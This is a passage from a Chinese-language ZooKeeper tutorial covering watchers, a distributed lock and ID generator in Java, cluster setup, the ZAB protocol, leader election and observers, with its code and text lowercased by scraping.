asynccallback.childrencallback() {\n               @override\n               public void processresult(int rc, string path, object ctx, list<string> list) {\n                   list.foreach(system.out::println);\n                   system.out.println(rc + " " + path + " " + ctx);\n               }\n           }, "i am children");\n           timeunit.seconds.sleep(3);\n       }\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   8\n   9\n   10\n   11\n   12\n   13\n   14\n   15\n   \n\n# 检查节点是否存在\n\n同步、异步\n\n * // 同步\n   exists(string path, boolean watch)\n   exists(string path, watcher watcher)\n   // 异步\n   exists(string path, boolean watch, statcallback cb, object ctx)\n   exists(string path, watcher watcher, statcallback cb, object ctx)\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   \n * \n\n * 参数         解释\n   path       节点路径\n   boolean    \n   callback   异步回调，可以获取节点列表\n   ctx        传递上下文参数\n\n * public static void exists1() throws exception{\n       stat exists = zookeeper.exists("/hadoopx", false);\n       // 判空\n       system.out.println(exists.getversion() + "成功");\n   }\n   public static void exists2() throws exception{\n       zookeeper.exists("/hadoopx", false, new asynccallback.statcallback() {\n           @override\n           public void processresult(int rc, string path, object ctx, stat stat) {\n               // 判空\n               system.out.println(rc + " " + path + " " + ctx +" " + stat.getversion());\n           }\n       }, "i am children");\n       timeunit.seconds.sleep(1);\n   }\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   8\n   9\n   10\n   11\n   12\n   13\n   14\n   15\n   \n\n\n# 事件监听机制\n\nwatcher概念\n\nhttps://zookeeper.apache.org/doc/r3.4.14/zookeeperprogrammers.html#sc_watchrememberthese\n\n * zookeeper提供了数据的发布/订阅功能，多个订阅者可同时监听某一特定主题对象，当该主题对象的自身状态发生变化时例如节点内容改变、节点下的子节点列表改变等，会实时、主动通知所有订阅者\n * zookeeper采用了 watcher机制实现数据的发布订阅功能。该机制在被订阅对象发生变化时会异步通知客户端，因此客户端不必在 watcher注册后轮询阻塞，从而减轻了客户端压力\n * watcher机制事件上与观察者模式类似，也可看作是一种观察者模式在分布式场景下的实现方式\n\n# watcher架构\n\nwatcher实现由三个部分组成\n\n * zookeeper服务端\n * zookeeper客户端\n * 客户端的zkwatchmanager对象\n\n客户端首先将 watcher注册到服务端，同时将 watcher对象保存到客户端的watch管理器中。当zookeeper服务端监听的数据状态发生变化时，服务端会主动通知客户端，接着客户端的 watch管理器会**触发相关 watcher**来回调相应处理逻辑，从而完成整体的数据 发布/订阅流程\n\n\n\n# watcher特性\n\n * \n\n * 特性        说明\n   一次性       watcher是一次性的，一旦被触发就会移除，再次使用时需要重新注册\n   客户端顺序回调   watcher回调是顺序串行执行的，只有回调后客户端才能看到最新的数据状态。一个watcher回调逻辑不应该太多，以免影响别的watcher执行\n   轻量级       watchevent是最小的通信单位，结构上只包含通知状态、事件类型和节点路径，并不会告诉数据节点变化前后的具体内容\n   时效性       watcher只有在当前session彻底失效时才会无效，若在session有效期内快速重连成功，则watcher依然存在，仍可接收到通知；\n\nwatcher接口设计\n\nwatcher是一个接口，任何实现了watcher接口的类就算一个新的watcher。watcher内部包含了两个枚举类：keeperstate、eventtype\n\n\n\n# watcher通知状态(keeperstate)\n\nkeeperstate是客户端与服务端连接状态发生变化时对应的通知类型。路径为org.apache.zookeeper.watcher.eventkeeperstate，是一个枚举类，其枚举属性如下：\n\n * \n\n * 枚举属性            说明\n   syncconnected   客户端与服务器正常连接时\n   disconnected    客户端与服务器断开连接时\n   expired         会话session失效时\n   authfailed      身份认证失败时\n\n# watcher事件类型(eventtype)\n\neventtype是数据节点znode发生变化时对应的通知类型。eventtype变化时keeperstate永远处于syncconnected通知状态下；当keeperstate发生变化时，eventtype永远为none。其路径为org.apache.zookeeper.watcher.event.eventtype，是一个枚举类，枚举属性如下：\n\n * \n\n * 枚举属性                  说明\n   none                  无\n   nodecreated           watcher监听的数据节点被创建时\n   nodedeleted           watcher监听的数据节点被删除时\n   nodedatachanged       watcher监听的数据节点内容发生更改时(无论数据是否真的变化)\n   nodechildrenchanged   watcher监听的数据节点的子节点列表发生变更时\n\n * 注意：客户端接收到的相关事件通知中只包含状态以及类型等信息，不包含节点变化前后的具体内容，变化前的数据需业务自身存储，变化后的数据需要调用get等方法重新获取\n\n# 捕获相应的事件\n\n上面讲到zookeeper客户端连接的状态和zookeeper对znode节点监听的事件类型，下面我们来讲解如何建立zookeeper的***watcher监听***。在zookeeper中采用zk.getchildren(path,watch)、zk.exists(path,watch)、zk.getdata(path,watcher,stat)这样的方式来为某个znode注册监听 。\n\n下表以node-x节点为例，说明调用的注册方法和可用监听事件间的关系：\n\n注册方式                                created   childrenchanged   changed   deleted\nzk.exists("/node-x",watcher)        可监控                         可监控       可监控\nzk.getdata("/node-x",watcher)                                   可监控       可监控\nzk.getchildren("/node-x",watcher)             可监控                         可监控\n\n注册watcher的方法\n\n# 客户端与服务器端的连接状态\n\n * keeperstate：通知状态\n\n * syncconnected：客户端与服务器正常连接时\n\n * disconnected：客户端与服务器断开连接时\n\n * expired：会话session失效时\n\n * authfailed：身份认证失败时\n\n * 事件类型为：none\n   \n   * 案例\n   \n   * public class zkconnectionwatcher implements watcher {\n         @override\n         public void process(watchedevent watchedevent) {\n             event.keeperstate state = watchedevent.getstate();\n             if(state == event.keeperstate.syncconnected){\n                 // 正常\n                 system.out.println("正常连接");\n             }else if (state == event.keeperstate.disconnected){\n                 // 可以用windows断开虚拟机网卡的方式模拟\n                 // 当会话断开会出现，断开连接不代表不能重连，在会话超时时间内重连可以恢复正常\n                 system.out.println("断开连接");\n             }else if (state == event.keeperstate.expired){\n                 // 没有在会话超时时间内重新连接，而是当会话超时被移除的时候重连会走进这里\n                 system.out.println("连接过期");\n             }else if (state == event.keeperstate.authfailed){\n                 // 在操作的时候权限不够会出现\n                 system.out.println("授权失败");\n             }\n             countdownlatch.countdown();\n         }\n         private static final string ip = "192.168.133.133:2181"\n     ;\n         private static countdownlatch countdownlatch = new countdownlatch(1);\n     \n         public static void main(string[] args) throws exception {\n             // 5000为会话超时时间\n             zookeeper zookeeper = new zookeeper(ip, 5000, new zkconnectionwatcher());\n             countdownlatch.await();\n             // 模拟授权失败\n             zookeeper.addauthinfo("digest1","itcast1:123451".getbytes());\n             byte[] data = zookeeper.getdata("/hadoop", false, null);\n             system.out.println(new string(data));\n             timeunit.seconds.sleep(50);\n         }\n     }\n     \n     \n     1\n     2\n     3\n     4\n     5\n     6\n     7\n     8\n     9\n     10\n     11\n     12\n     13\n     14\n     15\n     16\n     17\n     18\n     19\n     20\n     21\n     22\n     23\n     24\n     25\n     26\n     27\n     28\n     29\n     30\n     31\n     32\n     33\n     34\n     35\n     \n\n# watcher检查节点\n\nexists\n\n * exists(string path, boolean b)\n\n * exists(string path, watcher w)\n\n * nodecreated：节点创建\n\n * nodedeleted：节点删除\n\n * nodedatachanged：节点内容\n   \n   * 案例\n   \n   * public class eventtypetest {\n         private static final string ip = "192.168.133.133:2181";\n         private static countdownlatch countdownlatch = new countdownlatch(1);\n         private static zookeeper zookeeper;\n     \n         // 采用zookeeper连接创建时的监听器\n         public static void exists1() throws exception{\n             zookeeper.exists("/watcher1",true);\n         }\n         // 自定义监听器\n         public static void exists2() throws exception{\n             zookeeper.exists("/watcher1",(watchedevent w) -> {\n                 system.out.println("自定义" + w.gettype());\n             });\n         }\n         // 演示使用多次的监听器\n         public static void exists3() throws exception{\n             zookeeper.exists("/watcher1", new watcher() {\n                 @override\n                 public void process(watchedevent watchedevent) {\n                     try {\n                         system.out.println("自定义的" + watchedevent.gettype());\n                     } finally {\n                         try {\n                             zookeeper.exists("/watcher1",this);\n                         } catch (exception e) {\n                             e.printstacktrace();\n                         }\n                     }\n                 }\n             });\n         }\n         // 演示一节点注册多个监听器\n         public static void exists4() throws exception{\n             zookeeper.exists("/watcher1",(watchedevent w) -> {\n                 system.out.println("自定义1" + w.gettype());\n             });\n             zookeeper.exists("/watcher1", new watcher() {\n                 @override\n                 public void process(watchedevent watchedevent) {\n                     try {\n                         system.out.println("自定义2" + watchedevent.gettype());\n                     } finally {\n                         try {\n                             zookeeper.exists("/watcher1",this);\n                         } catch (exception e) {\n                             e.printstacktrace();\n                         }\n                     }\n                 }\n             });\n         }\n         // 测试\n         public static void main(string[] args) throws exception {\n             zookeeper = new zookeeper(ip, 5000, new zkwatcher());\n             countdownlatch.await();\n             exists4();\n             timeunit.seconds.sleep(50);\n         }\n     \n         static class zkwatcher implements watcher{\n             @override\n             public void process(watchedevent watchedevent) {\n                 countdownlatch.countdown();\n                 system.out.println("zk的监听器" + watchedevent.gettype());\n             }\n         }\n     \n     }\n     \n     \n     1\n     2\n     3\n     4\n     5\n     6\n     7\n     8\n     9\n     10\n     11\n     12\n     13\n     14\n     15\n     16\n     17\n     18\n     19\n     20\n     21\n     22\n     23\n     24\n     25\n     26\n     27\n     28\n     29\n     30\n     31\n     32\n     33\n     34\n     35\n     36\n     37\n     38\n     39\n     40\n     41\n     42\n     43\n     44\n     45\n     46\n     47\n     48\n     49\n     50\n     51\n     52\n     53\n     54\n     55\n     56\n     57\n     58\n     59\n     60\n     61\n     62\n     63\n     64\n     65\n     66\n     67\n     68\n     69\n     \n\ngetdata\n\n * getdata(string path, boolean b, stat stat)\n * getdata(string path, watcher w, stat stat)\n * nodedeleted：节点删除\n * nodedatachange：节点内容发生变化\n\ngetchildren\n\n * getchildren(string path, boolean b)\n * getchildren(string path, watcher w)\n * nodechildrenchanged：子节点发生变化\n * nodedeleted：节点删除\n\n\n# 配置中心案例\n\n工作中有这样的一个场景：数据库用户名和密码信息放在一个配置文件中，应用读取该配置文件，配置文件信息放入缓存\n\n若数据库的用户名和密码改变时候，还需要重新加载媛存，比较麻烦，通过 zookeeper可以轻松完成,当数据库发生变化时自动完成缓存同步\n\n使用事件监听机制可以做出一个简单的配置中心\n\n设计思路\n\n 1. 连接zookeeper服务器\n 2. 读取zookeeper中的配置信息，注册watcher监听器，存入本地变量\n 3. 当zookeeper中的配置信息发生变化时，通过watcher的回调方法捕获数据变化事件\n 4. 重新获取配置信息\n\n\n# 分布式唯一id案例\n\n在过去的单库单表型系统中，通常第可以使用数据库字段自带的auto_ increment属性来自动为每条记录生成个唯一的id。但是分库分表后，就无法在依靠数据库的auto_ increment属性来唯一标识一条记录了。此时我们就可以用zookeeper在分布式环境下生成全局唯一id\n\npublic class idgenerate {\n\n    private static final string ip = "192.168.133.133:2181";\n    private static countdownlatch countdownlatch = new countdownlatch(1);\n    private static zookeeper zookeeper;\n\n    public static string generateid() throws exception {\n        return zookeeper.create("/id", new byte[0], zoodefs.ids.open_acl_unsafe, createmode.ephemeral_sequential);\n    }\n\n\n    public static void main(string[] args) throws exception {\n        zookeeper = new zookeeper(ip, 5000, new zkwatcher());\n        countdownlatch.await();\n        threadpoolexecutor threadpoolexecutor = new threadpoolexecutor(5, 5, 0, timeunit.seconds, new arrayblockingqueue<>(10));\n        for (int i = 0; i < 10; i++) {\n            threadpoolexecutor.execute(() -> {\n                try {\n                    system.out.println(generateid());\n                } catch (exception e) {\n                    e.printstacktrace();\n                }\n            });\n        }\n        timeunit.seconds.sleep(50);\n        threadpoolexecutor.shutdown();\n    }\n\n    static class zkwatcher implements watcher {\n        @override\n        public void process(watchedevent watchedevent) {\n            countdownlatch.countdown();\n            system.out.println("zk的监听器" + watchedevent.gettype());\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n\n\n\n# 分布式锁案例\n\n分布式锁有多种实现方式，比如通过数据库、redis都可实现。作为分布式协同工具zookeeper，当然也有着标准的实现方式。下面介绍在zookeeper中如果实现排他锁\n\n设计思路\n\n 1. 每个客户端往/locks下创建临时有序节点/locks/lock_，创建成功后/locks下面会有每个客户端对应的节点，如/locks/lock_000000001\n 2. 客户端取得/locks下子节点，并进行排序，判断排在前面的是否为自己，如果自己的锁节点在第一位，代表获取锁成功\n 3. 如果自己的锁节点不在第一位，则监听自己前一位的锁节点。例如，自己锁节点lock_000000002，那么则监听lock_000000001\n 4. 当前一位锁节点(lock_000000001)对应的客户端执行完成，释放了锁，将会触发监听客户端(lock_000000002)的逻辑\n 5. 监听客户端重新执行第2步逻辑，判断自己是否获得了锁\n 6. zookeeper是有工具包的(这里采用手写)\n\n// 线程测试类\npublic class threadtest {\n    public static void delayoperation(){\n        try {\n            timeunit.seconds.sleep(5);\n        } catch (interruptedexception e) {\n            e.printstacktrace();\n        }\n    }\n    static interface runable{\n        void run();\n    }\n    public static void run(runable runable,int threadnum){\n        threadpoolexecutor threadpoolexecutor = new threadpoolexecutor(30, 30,\n                0, timeunit.seconds, new arrayblockingqueue<>(10));\n        for (int i = 0; i < threadnum; i++) {\n            threadpoolexecutor.execute(runable::run);\n        }\n        threadpoolexecutor.shutdown();\n    }\n\n    public static void main(string[] args) {\n//        distributedlock distributedlock = new distributedlock();\n//        distributedlock.acquirelock();\n//        delayoperation();\n//        distributedlock.releaselock();\n        datetimeformatter datetimeformatter = datetimeformatter.ofpattern("yyyy-mm-dd hh:mm:ss");\n        // 每秒打印信息\n        run(() -> {\n            for (int i = 0; i < 999999999; i++) {\n                try {\n                    timeunit.seconds.sleep(1);\n                } catch (interruptedexception e) {\n                    e.printstacktrace();\n                }\n                string format = datetimeformatter.format(localdatetime.now());\n                system.out.println(format);\n            }\n        },1);\n        // 线程测试\n        run(() -> {\n            distributedlock distributedlock = new distributedlock();\n            distributedlock.acquirelock();\n            delayoperation();\n            distributedlock.releaselock();\n        },30);\n    }\n}\npublic class distributedlock {\n    private string ip = "192.168.133.133:2181";\n    private final string root_lock = "/root_lock";\n    private final string lock_prefix = "/lock_";\n    private final countdownlatch countdownlatch = new countdownlatch(1);\n    private final byte[] data = new byte[0];\n\n    private zookeeper zookeeper;\n    private string path;\n\n    private void init(){\n        // 初始化\n        try {\n            zookeeper = new zookeeper(ip, 200000, w -> {\n                if(w.getstate() == watcher.event.keeperstate.syncconnected){\n                    system.out.println("连接成功");\n                }\n                countdownlatch.countdown();\n            });\n            countdownlatch.await();\n        } catch (ioexception | interruptedexception e) {\n            e.printstacktrace();\n        }\n    }\n\n    // 暴露的外部方法，主逻辑\n    public void acquirelock(){\n        init();\n        createlock();\n        attemptlock();\n    }\n\n    // 暴露的外部方法，主逻辑\n    public void releaselock(){\n        try {\n            zookeeper.delete(path,-1);\n            system.out.println("锁释放了" + path);\n        } catch (interruptedexception | keeperexception e) {\n            e.printstacktrace();\n        }\n    }\n\n    private void createlock(){\n        try {\n            // 创建一个目录节点\n            stat root = zookeeper.exists(root_lock, false);\n            if(root == null)\n                zookeeper.create(root_lock, data, zoodefs.ids.open_acl_unsafe, createmode.persistent);\n            // 目录下创建子节点\n            path = zookeeper.create(root_lock + lock_prefix, data, zoodefs.ids.open_acl_unsafe, createmode.ephemeral_sequential);\n        } catch (keeperexception | interruptedexception e) {\n            e.printstacktrace();\n        }\n    }\n    private watcher watcher = new watcher() {\n        @override\n        public void process(watchedevent watchedevent) {\n            if (watchedevent.gettype() == event.eventtype.nodedeleted){\n                synchronized (this){\n                    this.notifyall();\n                }\n            }\n        }\n    };\n\n    private void attemptlock(){\n        try {\n            // 获取正在排队的节点，由于是zookeeper生成的临时节点，不会出错，这里不能加监视器\n            // 因为添加了监视器后，任何子节点的变化都会触发监视器\n            list<string> nodes = zookeeper.getchildren(root_lock,false);\n            nodes.sort(string::compareto);\n            // 获取自身节点的排名\n            int ranking = nodes.indexof(path.substring(root_lock.length() + 1));\n            // 已经是最靠前的节点了，获取锁\n            if(ranking == 0){\n                return;\n            }else {\n                // 并不是靠前的锁，监视自身节点的前一个节点\n                stat status = zookeeper.exists(root_lock+"/"+nodes.get(ranking - 1), watcher);\n                // 有可能这这个判断的瞬间，0号完成了操作(此时我们应该判断成功自旋才对)，但是上面的status变量已经获取了值并且不为空，1号沉睡\n                // 但是，请注意自行测试，虽然1号表面上沉睡了，但是实际上watcher.wait()是瞬间唤醒的\n                if(status == null){\n                    attemptlock();\n                }else {\n                    synchronized (watcher){\n                        watcher.wait();\n                    }\n                    attemptlock();\n                }\n            }\n        } catch (keeperexception | interruptedexception e) {\n            e.printstacktrace();\n        }\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n118\n119\n120\n121\n122\n123\n124\n125\n126\n127\n128\n129\n130\n131\n132\n133\n134\n135\n136\n137\n138\n139\n140\n141\n142\n143\n144\n\n\n\n# 集群搭建\n\nzookeeper官网——getting started——https://zookeeper.apache.org/doc/r3.4.14/zookeeperstarted.html#sc_runningreplicatedzookeeper\n\n完全配置——https://zookeeper.apache.org/doc/r3.4.14/zookeeperadmin.html#sc_zkmulitserversetup https://zookeeper.apache.org/doc/r3.4.14/zookeeperadmin.html#sc_configuration\n\n运行时复制的zookeeper\n\n说明：对于复制模式，至少需要三个服务器，并且强烈建议您使用奇数个服务器。如果只有两台服务器，那么您将处于一种情况，如果其中一台服务器发生故障，则没有足够的计算机构成多数仲裁(zk采用的是过半数仲裁。因此，搭建的集群要容忍n个节点的故障，就必须有2n+1台计算机，这是因为宕掉n台后，集群还残余n+1台计算机，n+1台计算机中必定有一个最完整最接近leader的follower，假如宕掉的n台都是有完整信息的，剩下的一台就会出现在残余的zk集群中。也就是说：zk为了安全，必须达到多数仲裁，否则没有leader，集群失败，具体体现在**leader选举-章**)。由于存在两个单点故障，因此两个服务器还不如单个服务器稳定。\n\n——关于2n+1原则，kafka官网有权威的解释(虽然kafka不采用)http://kafka.apache.org/0110/documentation.html#design_replicatedlog\n\n多数仲裁的设计是为了避免脑裂(zk，已经采用了多数仲裁，所以不会出现)，和数据一致性的问题\n\n * 脑裂：由于网络延迟等各种因素，最终导致集群一分为二，各自独立运行(两个leader)，集群就是坏的\n * 如果有两台服务器，两台都认为另外的zk宕掉，各自成为leader运行(假设可以，实际上选不出leader，可以实际搭建一个集群，看看一台zk是否能够成功集群，详见**leader选举**)，就会导致数据不一致。\n * 如果有三台服务器，一台因为网络分区，无法连接，剩下两台网络正常，选举出了leader，集群正常\n * 以此类推\n   * \n   * zk的设计天生就是cap中的cp，所以不会出现上述的脑裂和数据一致性问题，我们搭建zk仅需保证2n+1原则\n\n复制模式所需的conf / zoo.cfg文件类似于独立模式下使用的文件，但有一些区别。这是一个例子：\n\nticktime=2000\ndatadir=/var/lib/zookeeper\nclientport=2181\ninitlimit=5\nsynclimit=2\nserver.1=zoo1:2888:3888 # 这是多机部署\nserver.2=zoo2:2888:3888\nserver.3=zoo3:2888:3888\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n * 新的键值**initlimit是zookeeper用于限制选举中zookeeper服务连接到leader的时间，synclimit**限制服务器与leader的过期时间\n * 对于这两个超时，您都可以使用ticktime指定时间单位。在此示例中，initlimit的超时为5个滴答声，即2000毫秒/滴答声，即10秒\n * 表格*server.x的条目列出了组成zookeeper服务的服务器。服务器启动时，它通过在数据目录中查找文件myid*来知道它是哪台服务器。该文件包含ascii的服务器号。\n * 最后，记下每个服务器名称后面的两个端口号：“ 2888”和“ 3888”。对等方使用前一个端口连接到其他对等方。这种连接是必需的，以便对等方可以进行通信，例如，以商定更新顺序。更具体地说，zookeeper服务器使用此端口将follower连接到leader。当出现新的leader者时，follower使用此端口打开与leader的tcp连接。因为默认的leader选举也使用tcp，所以我们当前需要另一个端口来进行leader选举。这是第二个端口。\n\n正文搭建：单机环境下，jdk、zookeeper安装完毕，基于一台虚拟机，进行zookeeper伪集群搭建，zookeeper集群中包含3个节点，节点对外提供服务端口号，分别为2181、2182、2183\n\n 1. 基于zookeeper-3.4.10复制三份zookeeper安装好的服务器文件,目录名称分别为zookeeper2181、zookeeper2182、zookeeper2183\n    \n    cp -r zookeeper-3.4.10  zookeeper2181\n    cp -r zookeeper-3.4.10  zookeeper2182\n    cp -r zookeeper-3.4.10  zookeeper2183\n    \n    # cp -r zookeeper-3.1.10 ./zookeeper218{1..3}\n    \n    \n    1\n    2\n    3\n    4\n    5\n    \n\n 2. 修改zookeeper2181服务器对应配置文件\n\n# 服务器对应端口号\nclientport=2181\n# 数据快照文件所在路径\ndatadir=/opt/zookeeper2181/data\n# 集群配置信息\n   # server:a=b:c:d\n   # a:是一个数字，表示这个是服务器的编号\n   # b:是这个服务器的ip地址\n   # c:zookeeper服务器之间通信的端口(数据互通，必须的)\n   # d:leader选举的端口\nserver.1=192.168.133.133:2287:3387  # 这是伪集群部署，注意端口号  \nserver.2=192.168.133.133:2288:3388\nserver.3=192.168.133.133:2289:3389\n# 对，这些都是2181的配置文件\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n 3. 在上一步 datadir指定的目录下，创建myid文件，然后在该文件添加上一步server配置的对应a数字\n    \n    # zookeeper2181对应的数字为1\n    # /opt/zookeeper2181/data目录(即datadir的目录下)下执行命令\n    echo "1" > myid\n    \n    \n    1\n    2\n    3\n    \n\n 4. zookeeper2182、2183参照2/3进行相应配置\n\n 5. 分别启动三台服务器，检验集群状态\n    \n    检查：cd进入bin目录./zkserver status\n    \n    登录命令：\n    \n    ./zkcli.sh -server 192.168.60.130:2181\n    ./zkcli.sh -server 192.168.60.130:2182\n    ./zkcli.sh -server 192.168.60.130:2183\n    # 如果启动后没有显示出集群的状态，请自己检查端口和配置文件问题，主要是端口占用和配置文件问题\n    # ss -lntpd | grep 2181\n    \n    \n    1\n    2\n    3\n    4\n    5\n    \n\n# 一致性协议——zab协议\n\nzab协议的全称是 zookeeper atomic broadcast (zookeeper原子广播)。zookeeper是通过zab协议来保证分布式事务的最终一致性\n\n基于zab协议，zookeeper集群中的角色主要有以下三类，如下所示：\n\n角色                           描述\n领导者(leader)                  领导者负责进行投票的发起和决议，更新系统状态\n学习者(learner)-跟随者(follower)   follower用于接收客户端请求并向客户端返回结果，在选主过程中参与投票\n学习者(learner)-观察者(observer)   observer可以接收客户端连接，将写请求转发给leader节点。但observer不参加投票过程，只同步leader的状态。observer的目的是为了扩展系统，提高读取速度\n客户端(client)                  请求发起方\n\n·zab广播模式工作原理，通过类似两端式提交协议的方式解决数据一致性：\n\n\n\n 1. leader从客户端收到一个写请求\n 2. leader生成一个新的事务并为这个事务生成一个唯一的zxid\n 3. leader将事务提议(propose)发送给所有的follows节点\n 4. follower节点将收到的事务请求加入到本地历史队列(history queue)中，并发送ack给leader，表示确认提议\n 5. 当leader收到大多数follower(半数以上节点)的ack(acknowledgement)确认消息，leader会本地提交，并发送commit请求\n 6. 当follower收到commit请求时，从历史队列中将事务请求commit\n\n因为是半数以上的结点就可以通过事务请求，所以延迟不高\n\n# leader选举\n\n服务器状态\n\n * looking：寻找leader状态。当服务器处于该状态时，它会认为当前集群中没有leader，因此需要进入leader选举状态\n * following：跟随着状态。表明当前服务器角色是follower\n * observing：观察者状态。表明当前服务器角色是observer\n\n分为两种选举，服务器启动时的选举和服务器运行时期的选举\n\n服务器启动时期的leader选举\n\n在集群初始化节点，当有一台服务器server1启动时，其单独无法进行和完成leader选举，当第二台服务器server2启动时，此时两台及其可以相互通信，每台及其都试图找到leader，于是进入leader选举过程。选举过程如下：\n\n 1. 每个server发出一个投票。由于是初始状态，server1和server2都会将自己作为leader服务器来进行投票，每次投票都会包含所推举的myid和zxid，使用(myid，zxid)，此时server1的投票为(1，0)，server2的投票为(2，0)，然后各自将这个投票发给集群中的其它机器\n\n 2. 集群中的每台服务器都接收来自集群中各个服务器的投票\n\n 3. 处理投票。针对每一个投票，服务器都需要将别人的投票和自己的投票进行pk，规则如下\n    \n    * 优先检查zxid。zxid比较大的服务器优先作为leader(zxid较大者保存的数据更多)\n    \n    * 如果zxid相同。那么就比较myid。myid较大的服务器作为leader服务器\n      \n      对于server1而言，它的投票是(1，0)，接收server2的投票为(2，0)，首先会比较两者的zxid，均为0，再比较myid，此时server2的myid最大，于是更新自己的投票为(2，0)，然后重新投票，对于server2而言，无需更新自己的投票，只是再次向集群中所有机器发出上一次投票信息即可\n\n 4. 统计投票。每次投票后，服务器都会统计投票信息，判断是否已经有过半机器接受到相同的投票信息，对于server1、server2而言，都统计出集群中已经有两台机器接受了(2，0)的投票信息，此时便认为已经选举出了leader\n\n 5. 改变服务器状态。一旦确定了leader,每个服务器就会更新自己的状态，如果是follower，那么就变更为following，如果是leader，就变更为leading\n\n举例：如果我们有三个节点的集群，1，2，3，启动 1 和 2 后，2 一定会是 leader，3 再加入不会进行选举，而是直接成为follower—— 仔细观察 一台zk无法集群，没有leader\n\n服务器运行时期选举\n\n在zookeeper运行期间，leader与非leader服务器各司其职，即使当有非leader服务器宕机或者新加入，此时也不会影响leader，但是一旦leader服务器挂了，那么整个集群将暂停对外服务，进入新一轮leader选举，其过程和启动时期的leader选举过程基本一致\n\n假设正在运行的有server1、server2、server3三台服务器，当前leader是server2，若某一时刻leader挂了，此时便开始leader选举。选举过程如下\n\n 1. 变更状态。leader挂后，余下的服务器都会将自己的服务器状态变更为looking，然后开始进入leader选举过程\n 2. 每个server发出一个投票。在运行期间，每个服务器上的zxid可能不同，此时假定server1的zxid为122，server3的zxid为122，在第一轮投票中，server1和server3都会投自己，产生投票(1，122)，(3，122)，然后各自将投票发送给集群中所有机器\n 3. 接收来自各个服务器的投票。与启动时过程相同\n 4. 处理投票。与启动时过程相同，此时，server3将会成为leader\n 5. 统计投票。与启动时过程相同\n 6. 改变服务器的状态。与启动时过程相同\n\n# observer角色及其配置\n\nzookeeper官网——observers guidehttps://zookeeper.apache.org/doc/r3.4.14/zookeeperobservers.html\n\n尽管zookeeper通过使用客户端直接连接到该集合的投票成员表现良好，但是此体系结构使其很难扩展到大量客户端。问题在于，随着我们添加更多的投票成员，写入性能会下降。这是由于以下事实：写操作需要（通常）集合中至少一半节点的同意，因此，随着添加更多的投票者，投票的成本可能会显着增加。\n\n我们引入了一种称为observer的新型zookeeper节点，该节点有助于解决此问题并进一步提高zookeeper的可伸缩性。观察员是合法的非投票成员，他们仅听取投票结果，而听不到投票结果。除了这种简单的区别之外，观察者的功能与跟随者的功能完全相同-客户端可以连接到观察者，并向其发送读写请求。观察者像追随者一样将这些请求转发给领导者，但是他们只是等待听取投票结果。因此，我们可以在不影响投票效果的情况下尽可能增加观察员的数量。\n\n观察者还有其他优点。因为他们不投票，所以它们不是zookeeper选举中的关键部分。因此，它们可以在不损害zookeeper服务可用性的情况下发生故障或与群集断开连接。给用户带来的好处是，观察者可以通过比跟随者更不可靠的网络链接进行连接。实际上，观察者可用于与另一个数据中心的zookeeper服务器进行对话。观察者的客户端将看到快速读取，因为所有读取均在本地提供，并且由于缺少表决协议而需要的消息数量较小，因此写入会导致网络流量最小\n\novserver角色特点：\n\n 1. 不参与集群的leader选举\n 2. 不参与集群中写数据时的ack反馈\n\n为了使用observer角色，在任何想变成observer角色的配置文件中加入如下配置：\n\npeertype=observer\n\n\n1\n\n\n并在所有server的配置文件中，配置成observer模式的server的那行配置追加***:observer***，例如\n\nserver.1=192.168.133.133:2287:3387  # 注意端口号  \nserver.2=192.168.133.133:2288:3388\nserver.3=192.168.133.133:2289:3389:observer\n\n\n1\n2\n3\n\n\n注意2n+1原则——集群搭建\n\n# api连接集群\n\nzookeeper(string connectionstring, int sessiontimeout, watcher watcher)\n\n * connectionstring ：zookeeper集合主机\n * sessiontimeout：会话超时(以毫秒为单位)\n * watcher：实现"监听器"界面的对象。zookeeper集合通过监视器对象返回连接状态\n\n    public static void main(string[] args) throws exception {\n        countdownlatch countdownlatch = new countdownlatch(1);\n        zookeeper connection = new zookeeper("192.168.133.133:2181,192.168.133.133:2182,192.168.133.133:2183", 5000, watchedevent -> {\n            if (watchedevent.getstate() == watcher.event.keeperstate.syncconnected)\n                system.out.println("连接成功");\n            countdownlatch.countdown();\n        });\n        countdownlatch.await();\n        connection.create("/hadoop",new byte[0], zoodefs.ids.open_acl_unsafe,createmode.persistent);\n        system.out.println(connection.getsessionid());\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# curator介绍\n\nhttps://blog.csdn.net/wo541075754/article/details/68067872 关于第三方客户端的小介绍\n\nzkclient有对dubbo的一些操作支持，但是zkclient几乎没有文档，下面是curator\n\ncurator简介\n\ncurator是netflix公司开源的一个 zookeeper客户端，后捐献给 apache,，curator框架在zookeeper原生api接口上进行了包装，解决了很多zookeeper客户端非常底层的细节开发。提供zookeeper各种应用场景(比如:分布式锁服务、集群领导选举、共享计数器、缓存机制、分布式队列等的抽象封装，实现了fluent风格的apl接口，是最好用，最流行的zookeeper的客户端\n\n原生zookeeperapi的不足\n\n * 连接对象异步创建，需要开发人员自行编码等待\n * 连接没有自动重连超时机制\n * watcher一次注册生效一次\n * 不支持递归创建树形节点\n\ncurator特点\n\n * 解决session会话超时重连\n * watcher反复注册\n * 简化开发api\n * 遵循fluent风格api\n\n    \x3c!-- zookeeper --\x3e\n    <dependency>\n        <groupid>org.apache.zookeeper</groupid>\n        <artifactid>zookeeper</artifactid>\n        <version>3.4.10</version>\n    </dependency>\n    